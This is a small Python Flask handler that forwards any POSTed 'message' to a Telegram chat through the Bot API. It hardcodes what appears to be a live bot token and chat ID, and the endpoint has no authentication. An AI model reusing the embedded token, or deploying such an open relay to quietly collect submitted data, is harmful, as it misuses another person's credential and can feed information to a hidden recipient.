from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# التوكن والأيدي الخاصين بك المأخوذين من صورتك بدقة
TOKEN = "8713127522:AAGfj4acg204MMc0SX7keJNtP4fWN9L-lYQ"
CHAT_ID = "7984067238"

@app.route('/api/save', methods=['POST'])
def save_data():
    try:
        data = request.json
        message = data.get('message', 'لا توجد بيانات')

        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }

        response = requests.post(url, json=payload)
        
        if response.status_code == 200:
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error", "details": response.text}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def handler(environ, start_response):
    return app(environ, start_response)
